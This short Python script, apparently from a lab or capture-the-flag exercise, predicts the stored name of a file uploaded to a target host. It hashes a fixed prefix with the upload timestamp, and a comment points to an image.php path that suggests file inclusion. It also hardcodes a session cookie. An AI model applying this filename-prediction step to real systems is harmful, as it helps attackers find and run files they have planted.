#!/usr/bin/env python3

# import requests
from datetime import datetime 
from hashlib import md5

url = "http://10.10.11.135/upload.php"
cookies = {
	"PHPSESSID": "a5npdvso214dlikeiefkucmqpj"
}
filename = "game.jpg"
prefix = "$file_hash"
time = "Sun, 25 Dec 2022 06:11:44 GMT"

# r = requests.post(url, cookies=cookies, body=body)
# print(r.text)
# time = r.headers["Date"]
time = datetime.strptime(time, "%a, %d %b %Y %X %Z").strftime("%s")
filename = "game.jpg"
prefix = "$file_hash"

final = md5((prefix + str(time)).encode()).hexdigest() + '_' + filename
# print(f"Check http://10.10.11.135/image.php?img=images/uploads/{final}")
print(final)
